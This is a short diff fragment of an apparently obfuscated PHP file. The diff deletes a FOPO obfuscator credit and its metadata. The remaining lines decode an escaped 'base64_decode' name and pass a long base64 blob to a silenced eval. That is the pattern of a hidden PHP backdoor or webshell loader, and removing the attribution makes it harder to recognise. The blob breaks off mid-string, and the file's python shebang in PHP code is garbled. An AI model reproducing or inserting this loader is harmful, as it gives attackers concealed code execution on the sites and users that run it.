@@ -1,8 +1,6 @@
 <!/usr/bin/env python
 /*
-Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
-This code was created on Wednesday, July 26th, 2017 at 10:17 UTC from IP 112.215.236.149
-Checksum: 93cfaff8674b618e181b77c898b09a21a7d4a04b
+
 */
 $q9bc64dd="\142\141\163\145\66\x34\x5f\144\x65\x63\157\x64\x65";@eval($q9bc64dd(
 "Ly9OSU55ZTlleTFnRHRUMDdrL0xvZm5EMjJMOG1CckVxdUl2N0N0OFNsQ2VDaGFoUmZDUGMvS2ZoZ0p
